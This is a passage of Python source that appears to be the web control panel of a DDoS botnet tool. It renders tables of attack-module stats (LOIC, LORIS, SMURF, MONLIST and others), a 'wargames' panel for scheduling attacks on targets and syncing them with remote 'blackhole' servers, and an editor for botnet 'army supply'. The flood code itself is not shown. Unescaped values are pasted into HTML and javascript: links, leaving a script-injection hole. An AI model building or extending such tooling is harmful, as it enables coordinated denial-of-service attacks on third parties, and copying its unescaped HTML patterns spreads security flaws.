                        grid_spray = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not spray present
                        grid_spray = ''.join(random.sample(grid_spray,len(grid_spray))) # spray (obfuscation)
                        grid_smurf = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not smurf present
                        grid_smurf = ''.join(random.sample(grid_smurf,len(grid_smurf))) # smurf (obfuscation)
                        grid_xmas = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not xmas present
                        grid_xmas = ''.join(random.sample(grid_xmas,len(grid_xmas))) # xmas (obfuscation)
                        grid_nuke = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not nuke present
                        grid_nuke = ''.join(random.sample(grid_nuke,len(grid_nuke))) # nuke (obfuscation)
                        grid_tachyon = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not tachyon present
                        grid_tachyon = ''.join(random.sample(grid_tachyon,len(grid_tachyon))) # tachyon (obfuscation)
                        grid_monlist = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not monlist present
                        grid_monlist = ''.join(random.sample(grid_monlist,len(grid_monlist))) # monlist (obfuscation)
                        grid_fraggle = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not fraggle present
                        grid_fraggle = ''.join(random.sample(grid_fraggle,len(grid_fraggle))) # fraggle (obfuscation)
                        grid_sniper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not sniper present
                        grid_sniper = ''.join(random.sample(grid_sniper,len(grid_sniper))) # sniper (obfuscation)
                        grid_ufoack = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufoack present
                        grid_ufoack = ''.join(random.sample(grid_ufoack,len(grid_ufoack))) # ufoack (obfuscation)
                        grid_uforst = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not uforst present
                        grid_uforst = ''.join(random.sample(grid_uforst,len(grid_uforst))) # uforst (obfuscation)
                        grid_droper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not droper present
                        grid_droper = ''.join(random.sample(grid_droper,len(grid_droper))) # droper (obfuscation)
                        grid_overlap = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not overlap present
                        grid_overlap = ''.join(random.sample(grid_overlap,len(grid_overlap))) # overlap (obfuscation)
                        grid_pinger = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not pinger present
                        grid_pinger = ''.join(random.sample(grid_pinger,len(grid_pinger))) # pinger (obfuscation)
                        grid_ufoudp = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufoudp present
                        grid_ufoudp = ''.join(random.sample(grid_ufoudp,len(grid_ufoudp))) # ufoudp (obfuscation)
                        grid_contact = "<a href=javascript:alert('"+str(m[10][0:12])+"');>View</a>" # js contact view (obfuscation)
                        try:
                            grid_id = m[11] # id (plain id)
                        except:
                            grid_id = "invalid!"
                    elif version == 10: # v0.9
                        grid_loris = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not loris present
                        grid_loris = ''.join(random.sample(grid_loris,len(grid_loris))) # loris (obfuscation)
                        grid_ufosyn = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufosyn present
                        grid_ufosyn = ''.join(random.sample(grid_ufosyn,len(grid_ufosyn))) # ufosyn (obfuscation)
                        grid_spray = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not spray present
                        grid_spray = ''.join(random.sample(grid_spray,len(grid_spray))) # spray (obfuscation)
                        grid_smurf = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not smurf present
                        grid_smurf = ''.join(random.sample(grid_smurf,len(grid_smurf))) # smurf (obfuscation)
                        grid_xmas = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not xmas present
                        grid_xmas = ''.join(random.sample(grid_xmas,len(grid_xmas))) # xmas (obfuscation)
                        grid_nuke = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not nuke present
                        grid_nuke = ''.join(random.sample(grid_nuke,len(grid_nuke))) # nuke (obfuscation)
                        grid_tachyon = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not tachyon present
                        grid_tachyon = ''.join(random.sample(grid_tachyon,len(grid_tachyon))) # tachyon (obfuscation)
                        grid_monlist = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not monlist present
                        grid_monlist = ''.join(random.sample(grid_monlist,len(grid_monlist))) # monlist (obfuscation)
                        grid_fraggle = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not fraggle present
                        grid_fraggle = ''.join(random.sample(grid_fraggle,len(grid_fraggle))) # fraggle (obfuscation)
                        grid_sniper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not sniper present
                        grid_sniper = ''.join(random.sample(grid_sniper,len(grid_sniper))) # sniper (obfuscation)
                        grid_ufoack = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufoack present
                        grid_ufoack = ''.join(random.sample(grid_ufoack,len(grid_ufoack))) # ufoack (obfuscation)
                        grid_uforst = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not uforst present
                        grid_uforst = ''.join(random.sample(grid_uforst,len(grid_uforst))) # uforst (obfuscation)
                        grid_droper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not droper present
                        grid_droper = ''.join(random.sample(grid_droper,len(grid_droper))) # droper (obfuscation)
                        grid_overlap = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not overlap present
                        grid_overlap = ''.join(random.sample(grid_overlap,len(grid_overlap))) # overlap (obfuscation)
                        grid_pinger = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not pinger present
                        grid_pinger = ''.join(random.sample(grid_pinger,len(grid_pinger))) # pinger (obfuscation)
                        grid_ufoudp = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufoudp present
                        grid_ufoudp = ''.join(random.sample(grid_ufoudp,len(grid_ufoudp))) # ufoudp (obfuscation)
                        grid_contact = "<a href=javascript:alert('"+str(m[9][0:12])+"');>View</a>" # js contact view (obfuscation)
                        try:
                            grid_id = m[10] # id (plain id)
                        except:
                            grid_id = "invalid!"
                    else: # no valid version
                        pass
                    grid_table += "<tr><td align='center'>"+str(grid_nickname)+"</td><td align='center'>"+str(grid_ranking)+"</td><td align='center'>"+str(grid_totalchargo)+"</td><td align='center'>"+str(grid_dorking)+"</td><td align='center'>"+str(grid_transferred)+"</td><td align='center'>"+str(grid_maxchargo)+"</td><td align='center'>"+str(grid_missions)+"</td><td align='center'>"+str(grid_attacks)+"</td><td align='center'>"+str(grid_loic)+"</td><td align='center'>"+str(grid_loris)+"</td><td align='center'>"+str(grid_ufosyn)+"</td><td align='center'>"+str(grid_spray)+"</td><td align='center'>"+str(grid_smurf)+"</td><td align='center'>"+str(grid_xmas)+"</td><td align='center'>"+str(grid_nuke)+"</td><td align='center'>"+str(grid_tachyon)+"</td><td align='center'>"+str(grid_monlist)+"</td><td align='center'>"+str(grid_fraggle)+"</td><td align='center'>"+str(grid_sniper)+"</td><td align='center'>"+str(grid_ufoack)+"</td><td align='center'>"+str(grid_uforst)+"</td><td align='center'>"+str(grid_droper)+"</td><td align='center'>"+str(grid_overlap)+"</td><td align='center'>"+str(grid_pinger)+"</td><td align='center'>"+str(grid_ufoudp)+"</td><td align='center'>"+str(grid_contact)+"</td></tr>"
                else: # not valid stream data
                    pass
            grid_table += "</table>"
            if mothership_members == 0:
                mothership_members = "¿?"
            if unknown_members == 0:
                unknown_members = "¿?"
            l = time.ctime(os.path.getmtime(self.grid_file)) # get last modified time
            mother_grid = "<div id='grid_panel_enc' style='display:block'><br><center><u>MOTHERSHIP STATS:</u> (Last Update: <font color='green'>"+str(l)+"</font>)</center><br><table cellpadding='5' cellspacing='5' border='1' align='middle'><tr><td><font color='green'>MEMBERS:</font></td><td align='right'><font color='green'>"+str(mothership_members)+"</font></td><td><font color='orange' size='4'>-</font></td><td><font color='orange'>"+str(unknown_members)+"</font></td><td><font color='white' size='4'>*</font></td><td><font color='white'>¿?</font></td><td><font color='cyan' size='4'>**</font></td><td><font color='cyan'>¿?</font></td><td><font color='blueviolet' size='4'>***</font></td><td><font color='blueviolet'>¿?</font></td><td><font color='blue' size='4'>****</font></td><td><font color='blue'>¿?</font></td><td><font color='red' size='4'>&#x25BC;</font></td><td><font color='red'>¿?</font></td></tr></table><br><table cellpadding='5' cellspacing='5' border='1' align='middle'><tr><tr><td>MISSIONS:</td><td>¿?</td><td>ATTACKS:</td><td>¿?</td><td>CHARGO (ACTIVE!):</td><td>¿?</td><td>DORKING:</td><td>¿?</td><td>TRANSF:</td><td>¿?</td><td>MAX.CHARGO:</td><td>¿?</td></tr></table><br><table cellpadding='5' cellspacing='5' border='1' align='middle'><tr><td>LOIC:</td><td>¿?</td><td>LORIS:</td><td>¿?</td><td>UFOSYN:</td><td>¿?</td><td>SPRAY:</td><td>¿?</td><td>SMURF:</td><td>¿?</td></tr><tr><td>XMAS:</td><td>¿?</td><td>NUKE:</td><td>¿?</td><td>TACHYON:</td><td>¿?</td><td>MONLIST:</td><td>¿?</td></tr><tr><td>FRAGGLE:</td><td>¿?</td><td>SNIPER:</td><td>¿?</td><td>UFOACK:</td><td>¿?</td><td>UFORST:</td><td>¿?</td></tr><tr><td>DROPER:</td><td>¿?</td><td>OVERLAP:</td><td>¿?</td><td>PINGER:</td><td>¿?</td><td>UFOUDP:</td><td>¿?</td></tr></table><br><hr><br>"
            grid_table = mother_grid + grid_table + "</div>"
            return grid_table

    def html_grid(self):
        if self.ranking == "Rookie": # Rookie
            your_ranking = "<font color='white'>Rookie [*]</font>"
        elif self.ranking == "Mercenary": # Mercenary
            your_ranking = "<font color='cyan'>Mercenary [**]</font>"
        elif self.ranking == "Bandit": # Bandit 
            your_ranking = "<font color='blueviolet'>Bandit [***]</font>"
        elif self.ranking == "UFOmmander!": # UFOmmander!
            your_ranking = "<font color='blue'>UFOmmander! [****]</font>"
        elif self.ranking == "UFOl33t!": # UFOl33t!
            your_ranking = "<font color='red'>UFOl33t! [&#x25BC;]</font>"
        else:
            your_ranking = "<font color='yellow' size='4'>[-]</font> ( no0b! )" # no0b hacking attempt! ;-)
        if '"grid_token": "NONE"' in open(self.mothership_gridcfg_file).read():
            device_state = "OFF"
            device = "GRID device: <font color='red'>OFF</font><br>"
        else:
            device_state = "ON"
            gridcfg_json_file = open(self.mothership_gridcfg_file, "r") # extract mothership gridcfg
            data = json.load(gridcfg_json_file)
            gridcfg_json_file.close()
            grid_token = data["grid_token"]
            grid_contact = data["grid_contact"]
            grid_contact.encode('utf-8')
            grid_nick = data["grid_nick"]
            grid_nick.encode('utf-8')
            device = "<table cellpadding='5'><tr><td> -CONTACT: "+str(grid_contact)+"</td></tr><tr><td> -NICKNAME: "+str(grid_nick)+"</td></tr><tr><td> -RANKING: "+str(your_ranking)+"</td></tr><tr><td> -ID: "+str(grid_token)+"</td></tr></table>"
        if device_state == "OFF":
            grid_panel = ""
        else:
            grid_table = self.generate_grid()
            grid_panel = grid_table + "<br><div id='cmdOut'></div><br></center><center>"
        if device_state == "OFF":
            dec_panel = ""
        else:
            dec_panel = "<table cellpading='5' cellspacing='10'><tr><td><form method='GET'>Your key: <input type='text' name='grid_key' id='grid_key' size='20' value='"+ str(self.crypto_key) +"'></td><td><a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt_grid();>Try decryption!</a></form></td></tr></table>"
        if device_state == "OFF":
            sync_panel = ""
        else:
            sync_panel = "<table cellpadding='2' cellspacing='2'><tr><td><table cellpadding='5' cellspacing='5'><tr><td>Blackhole/IP:</td><td><input type='text' name='grid_source' id='grid_source' size='20' value='"+default_blackhole+"'></td></tr></table></td><td><button title='Search for records on that blackhole...' onclick='SyncGrid()' style='color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;'>Sync device...</button></td></tr></table><hr>"
        if device_state == "OFF":
            transfer_panel = ""
        else:
            transfer_panel = "<form method='GET'><table cellpadding='5' cellspacing='5'><tr><td><table cellpadding='5' cellspacing='5'><tr><td>Blackhole/IP:</td><td><input type='text' name='grid_source_upload' id='grid_source_upload' size='20' value='"+default_blackhole+"'></td></tr><tr><td>Key (encryption):</td><td><input type='text' name='grid_key_upload' id='grid_key_upload' size='20' value='"+ str(self.crypto_key) +"'></td></tr></table></td><td><button title='Upload stats of your mothership to the Grid of that blackhole...' onclick='TransferGrid()' style='color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;'>Transfer data...</button></td></tr></table></form><hr>"
        if device_state == "OFF":
            remove_grid = ""
        else:
            remove_grid = '| <button title="Review your mothership stats..." onclick="Stats()">STATS!</button> | <button title="Syncronize data from a blackhole/grid with your device..." onclick="Sync_panel()">DOWNLOAD!</button> | <button title="Decrypt data with a specific key..." onclick="Decryption_panel()">DECRYPT!</button> | <button title="Send your data to a global blackhole/grid..." onclick="Transfer_panel()">UPLOAD!</button> | <button title="Remove your profile and turn OFF this device..." onclick="RemoveGrid()">TURN OFF!</button>'
        return self.pages["/header"] + """<script language="javascript"> 
function GridProfile() {
        var win_grid_profile = window.open("grid_profile","_parent","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function RemoveGrid() {
        var win_grid_profile = window.open("grid_remove","_parent","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Stats() {
        var win_grid_profile = window.open("stats","_parent","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Sync_panel(){
         document.getElementById("sync_panel_block").style.display = "block";
         document.getElementById("dec_panel").style.display = "none";
         document.getElementById("transfer_panel").style.display = "none";
       }
function SyncGrid(){
        grid_source=document.getElementById("grid_source").value
        if(grid_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
         }else{
          params="grid_source="+escape(grid_source)
         runCommandX("cmd_sync_grid",params)
         setTimeout("location.reload()", 10000)
         }
      }
function Transfer_panel(){
         document.getElementById("transfer_panel").style.display = "block";
         document.getElementById("sync_panel_block").style.display = "none";
         document.getElementById("dec_panel").style.display = "none";
       }
function TransferGrid() {
        grid_source=document.getElementById("grid_source_upload").value
        grid_key=document.getElementById("grid_key_upload").value
        if(grid_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
        }else{
          if(grid_key == "") {
            window.alert("You need to enter a valid key (provided by someone)");
            return
          }else{
            params="grid_source="+escape(grid_source)+"&grid_key="+escape(grid_key)
            runCommandX("cmd_transfer_grid",params)
            setTimeout("location.reload()", 10000)
          }
        }
       }
function Decryption_panel(){
         document.getElementById("dec_panel").style.display = "block";
         document.getElementById("transfer_panel").style.display = "none";
         document.getElementById("sync_panel_block").style.display = "none";
       }
function Decrypt_grid(){
        grid_key=document.getElementById("grid_key").value
        if(grid_key == "") {
          window.alert("You need to enter a valid key (provided by someone)");
          return
         }else{
          params="grid_key="+escape(grid_key)
         runCommandX("cmd_decrypt_grid",params)
         panel_enc = document.getElementById("grid_panel_enc").style.display
         if(panel_enc == "block"){
         panel_enc = document.getElementById("grid_panel_enc").style.display = 'none';
         }
        }
      }
function GridFilter(filter, key){
        params="filter="+escape(filter)+"&key="+escape(key)
        runCommandX("cmd_grid_filter", params)
        setTimeout("Decrypt_grid()", 2000)
     }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br><center>
<table cellpadding="5" cellspacing="5"><tr>
<td><a href="javascript:alert('7337-VH13 says: """ + self.ranking + """... Welcome to the Grid!. A good place to represent our Federation.');"><img src='data:image/png;base64,"""+self.alien6_img+"""'></a></td><td>
<table cellpading="5" cellspacing="10"><tr><td>"""+device+"""<br><button title="Set your profile for this device..." onclick="GridProfile()">CONFIGURE!</button> """+remove_grid+"""</td></tr></table></tr></table>
<hr><div id='sync_panel_block' name='sync_panel_block' style='display:none;'>"""+sync_panel+"""</div><div id='transfer_panel' name='transfer_panel' style='display:none;'>"""+transfer_panel+"""</div><div id="dec_panel" style="display:none;">"""+dec_panel+"""<hr></div>"""+grid_panel+"""
""" + self.pages["/footer"]

    def generate_wargames(self):
        with open(self.wargames_file) as f:
            for line in f:
                line = line.strip()
            f.close()
            wargames_table = "<table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><u>CREATION:</u></td><td align='center'><u>TARGET:</u></td><td align='center'><u>DATE:</u></td><td align='center'><u>ETA:</u></td><td align='center'><u>STATUS:</u></td></tr>"
            for m in self.list_wargames: # list = creation, target, estimated
                if wargames_msg_sep in m:
                    m = m.split(wargames_msg_sep)
                    wargame_creation = m[0][0:12] # creation date
                    wargame_creation = ''.join(random.sample(wargame_creation,len(wargame_creation))) # creation date (obfuscation)
                    wargame_target = m[1][0:12] # target (obfuscation)
                    wargame_target = ''.join(random.sample(wargame_target,len(wargame_target))) # target (obfuscation)
                    wargame_estimated = m[2][0:12] # estimated date
                    wargame_estimated = ''.join(random.sample(wargame_estimated,len(wargame_estimated))) # estimated date (obfuscation)
                    wargame_state = str("HSvtfBFwQBSms8h/7Ra/tKGNYp7KqiiNeOMPzDmrChJqyBJ+yuRiHpY9H+/LDQ==")[0:12] # state ("ENCRYPTED!")
                    wargame_state = ''.join(random.sample(wargame_state,len(wargame_state))) # state (obfuscation)
                    wargame_status = wargame_state # status (obfuscated like state)
                    wargames_table += "<tr><td align='center'>"+str(wargame_creation)+"</td><td align='center'>"+str(wargame_target)+"</td><td align='center'>"+str(wargame_estimated)+"</td><td align='center'>"+str(wargame_state)+"</td><td align='center'>"+str(wargame_status)+"</td></tr>"
            wargames_table += "</table>"
            mother_wargame = "<div id='wargames_panel_enc' style='display:block'>"
            wargames_table = mother_wargame + wargames_table + "</div>"
            return wargames_table

    def html_wargames(self):
        l = time.ctime(os.path.getmtime(self.wargames_file)) # get last modified time
        now = strftime("%d-%m-%Y %H:%M:%S", gmtime())
        wargames_table = self.generate_wargames()
        return self.pages["/header"] + """<script language="javascript">
function Decrypt_wargames(){
        wargames_deckey=document.getElementById("wargames_deckey").value
        if(wargames_deckey == "") {
          window.alert("You need to enter a valid key (provided by someone)");
          return
         }else{
          params="wargames_deckey="+escape(wargames_deckey)
         runCommandX("cmd_decrypt_wargames",params)
         panel_enc = document.getElementById("wargames_panel_enc").style.display
         if(panel_enc == "block"){
           panel_enc = document.getElementById("wargames_panel_enc").style.display = 'none';
        }
       }
      }
function SyncWargames(){
        wargames_source=document.getElementById("wargames_source").value
        if(wargames_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
         }else{
          params="wargames_source="+escape(wargames_source)
         runCommandX("cmd_sync_wargames",params)
         setTimeout("location.reload()", 10000)
         }
      }
function Send() {
        wargames_source2=document.getElementById("wargames_source2").value
        wargames_enckey=document.getElementById("wargames_enckey").value
        wargames_target=document.getElementById("wargames_target").value
        wargames_estimated=document.getElementById("wargames_estimated").value
        if(wargames_source2 == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
        }else{
          if(wargames_enckey == "") {
            window.alert("You need to enter a valid key (provided by someone)");
            return
          }else{
            params="wargames_source2="+escape(wargames_source2)+"&wargames_enckey="+escape(wargames_enckey)+"&wargames_target="+escape(wargames_target)+"&wargames_estimated="+escape(wargames_estimated)
            runCommandX("cmd_transfer_wargame",params)
            setTimeout("location.reload()", 10000)
          }
        }
      }
function JobRemove(id) {
        params="id="+escape(id)
        runCommandX("cmd_job_remove",params)
        setTimeout("Decrypt_wargames()", 2000)
      }
function JobAdd(id) {
        params="id="+escape(id)
        runCommandX("cmd_job_add", params)
        setTimeout("Decrypt_wargames()", 2000)
     }
function JobAddAll() {
        runCommandX("cmd_job_add_all")
        setTimeout("Decrypt_wargames()", 2000)
     }
function JobCancel(id) {
        params="id="+escape(id)
        runCommandX("cmd_job_cancel", params)
        setTimeout("Decrypt_wargames()", 2000)
     }
function JobRemoveAll(key) {
        params="key="+escape(key)
        runCommandX("cmd_job_remove_all", params)
        setTimeout("Decrypt_wargames()", 2000)
     }
function JobCancelAll() {
        runCommandX("cmd_job_cancel_all")
        setTimeout("Decrypt_wargames()", 2000)
     }
function JobFilter(filter, key) {
        params="filter="+escape(filter)+"&key="+escape(key)
        runCommandX("cmd_job_filter", params)
        setTimeout("Decrypt_wargames()", 2000)
}
function EditSupply(){
        if(document.getElementById("supply_edit").value == "EDIT"){
          document.getElementById("supply_botnet").readOnly = false;
          document.getElementById("supply_loic").readOnly = false;
          document.getElementById("supply_loris").readOnly = false;
          document.getElementById("supply_ufosyn").readOnly = false;
          document.getElementById("supply_spray").readOnly = false;
          document.getElementById("supply_smurf").readOnly = false;
          document.getElementById("supply_xmas").readOnly = false;
          document.getElementById("supply_nuke").readOnly = false;
          document.getElementById("supply_tachyon").readOnly = false;
          document.getElementById("supply_monlist").readOnly = false;
          document.getElementById("supply_fraggle").readOnly = false;
          document.getElementById("supply_sniper").readOnly = false;
          document.getElementById("supply_ufoack").readOnly = false;
          document.getElementById("supply_uforst").readOnly = false;
          document.getElementById("supply_droper").readOnly = false;
          document.getElementById("supply_overlap").readOnly = false;
          document.getElementById("supply_pinger").readOnly = false;
          document.getElementById("supply_ufoudp").readOnly = false;
          document.getElementById("supply_edit").title = "Set global army supply..."
          document.getElementById("supply_edit").value = "SET"
          document.getElementById("supply_edit").innerHTML = "SET!"
        }else{
          supply_botnet=document.getElementById("supply_botnet").value
          supply_loic=document.getElementById("supply_loic").value
          supply_loris=document.getElementById("supply_loris").value
          supply_ufosyn=document.getElementById("supply_ufosyn").value
          supply_spray=document.getElementById("supply_spray").value
          supply_smurf=document.getElementById("supply_smurf").value
          supply_xmas=document.getElementById("supply_xmas").value
          supply_nuke=document.getElementById("supply_nuke").value
          supply_tachyon=document.getElementById("supply_tachyon").value
          supply_monlist=document.getElementById("supply_monlist").value
          supply_fraggle=document.getElementById("supply_fraggle").value
          supply_sniper=document.getElementById("supply_sniper").value
          supply_ufoack=document.getElementById("supply_ufoack").value
          supply_uforst=document.getElementById("supply_uforst").value
          supply_droper=document.getElementById("supply_droper").value
          supply_overlap=document.getElementById("supply_overlap").value
          supply_pinger=document.getElementById("supply_pinger").value
          supply_ufoudp=document.getElementById("supply_ufoudp").value
          if(isNaN(parseFloat(supply_botnet)) || parseFloat(supply_botnet) < 0) {
            window.alert("You need to enter a valid BOTNET supply number (int>=0)");
            return
          }else{
            if(isNaN(parseFloat(supply_loic)) || parseFloat(supply_loic) < 0) {
              window.alert("You need to enter a valid LOIC supply number (int>=0)");
              return
            }else{
                if(isNaN(parseFloat(supply_loris)) || parseFloat(supply_loris) < 0) {
                window.alert("You need to enter a valid LORIS supply number (int>=0)");
                return
              }else{
                  if(isNaN(parseFloat(supply_ufosyn)) || parseFloat(supply_ufosyn) < 0) {
                  window.alert("You need to enter a valid UFOSYN supply number (int>=0)");
                  return
       		 }else{
                     if(isNaN(parseFloat(supply_spray)) || parseFloat(supply_spray) < 0) {
                     window.alert("You need to enter a valid SPRAY supply number (int>=0)");
                     return
                   }else{
                      if(isNaN(parseFloat(supply_smurf)) || parseFloat(supply_smurf) < 0) {
                      window.alert("You need to enter a valid SMURF supply number (int>=0)");
                      return
                     }else{
                       if(isNaN(parseFloat(supply_xmas)) || parseFloat(supply_xmas) < 0) {
                       window.alert("You need to enter a valid XMAS supply number (int>=0)");
                       return
                      }else{
                       if(isNaN(parseFloat(supply_nuke)) || parseFloat(supply_nuke) < 0) {
                       window.alert("You need to enter a valid NUKE supply number (int>=0)");
                       return
                       }else{
                        if(isNaN(parseFloat(supply_tachyon)) || parseFloat(supply_tachyon) < 0) {
                        window.alert("You need to enter a valid TACHYON supply number (int>=0)");
                        return
                        }else{
                         if(isNaN(parseFloat(supply_monlist)) || parseFloat(supply_monlist) < 0) {
                         window.alert("You need to enter a valid MONLIST supply number (int>=0)");
                         return
                         }else{
                          if(isNaN(parseFloat(supply_fraggle)) || parseFloat(supply_fraggle) < 0) {
                          window.alert("You need to enter a valid FRAGGLE supply number (int>=0)");
                          return
                          }else{
                           if(isNaN(parseFloat(supply_sniper)) || parseFloat(supply_sniper) < 0) {
                           window.alert("You need to enter a valid SNIPER supply number (int>=0)");
                           return
                          }else{
                           if(isNaN(parseFloat(supply_ufoack)) || parseFloat(supply_ufoack) < 0) {
                           window.alert("You need to enter a valid UFOACK supply number (int>=0)");
                           return
                          }else{
                           if(isNaN(parseFloat(supply_uforst)) || parseFloat(supply_uforst) < 0) {
                           window.alert("You need to enter a valid UFORST supply number (int>=0)");
                           return
                           }else{
                            if(isNaN(parseFloat(supply_droper)) || parseFloat(supply_droper) < 0) {
                            window.alert("You need to enter a valid DROPER supply number (int>=0)");
                            return
                           }else{
                            if(isNaN(parseFloat(supply_overlap)) || parseFloat(supply_overlap) < 0) {
                            window.alert("You need to enter a valid OVERLAP supply number (int>=0)");
                            return
                          }else{
                           if(isNaN(parseFloat(supply_pinger)) || parseFloat(supply_pinger) < 0) {
                           window.alert("You need to enter a valid PINGER supply number (int>=0)");
                           return
                          }else{
                            if(isNaN(parseFloat(supply_ufoudp)) || parseFloat(supply_ufoudp) < 0) {
                            window.alert("You need to enter a valid UFOUDP supply number (int>=0)");
                            return
                    }else{
	                document.getElementById("supply_botnet").readOnly = true;
          	        document.getElementById("supply_loic").readOnly = true;
	                document.getElementById("supply_loris").readOnly = true;
	                document.getElementById("supply_ufosyn").readOnly = true;
                        document.getElementById("supply_spray").readOnly = true;
                        document.getElementById("supply_smurf").readOnly = true;
                        document.getElementById("supply_xmas").readOnly = true;
                        document.getElementById("supply_nuke").readOnly = true;
                        document.getElementById("supply_tachyon").readOnly = true;
                        document.getElementById("supply_monlist").readOnly = true;
                        document.getElementById("supply_fraggle").readOnly = true;
                        document.getElementById("supply_sniper").readOnly = true;
                        document.getElementById("supply_ufoack").readOnly = true;
                        document.getElementById("supply_uforst").readOnly = true;
                        document.getElementById("supply_droper").readOnly = true;
                        document.getElementById("supply_overlap").readOnly = true;
                        document.getElementById("supply_pinger").readOnly = true;
                        document.getElementById("supply_ufoudp").readOnly = true;
	                document.getElementById("supply_edit").title = "Edit global army supply..."
	                document.getElementById("supply_edit").value = "EDIT"
	                document.getElementById("supply_edit").innerHTML = "EDIT"
                    params="botnet="+escape(supply_botnet)+"&loic="+escape(supply_loic)+"&loris="+escape(supply_loris)+"&ufosyn="+escape(supply_ufosyn)+"&spray="+escape(supply_spray)+"&smurf="+escape(supply_smurf)+"&xmas="+escape(supply_xmas)+"&nuke="+escape(supply_nuke)+"&tachyon="+escape(supply_tachyon)+"&monlist="+escape(supply_monlist)+"&fraggle="+escape(supply_fraggle)+"&sniper="+escape(supply_sniper)+"&ufoack="+escape(supply_ufoack)+"&uforst="+escape(supply_uforst)+"&droper="+escape(supply_droper)+"&overlap="+escape(supply_overlap)+"&pinger="+escape(supply_pinger)+"&ufoudp="+escape(supply_ufoudp)
                    runCommandX("cmd_edit_supply",params)
                    setTimeout("Decrypt_wargames()", 2000)
                             }
                            }
                           }
                          }
                         }
                        }
                       }
                      }
                     }
                    }
                  }
                }
              }
            }
         }
       }
     }
   }
 }
}
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center>
<table cellpadding="5" cellspacing="5"><tr>
<td><a href="javascript:alert('Vnïjwvödvnh says: """ + self.ranking + """... Are you searching for some real action?. Well, this is your place...');"><img src='data:image/png;base64,"""+self.alien8_img+"""'></a></td>
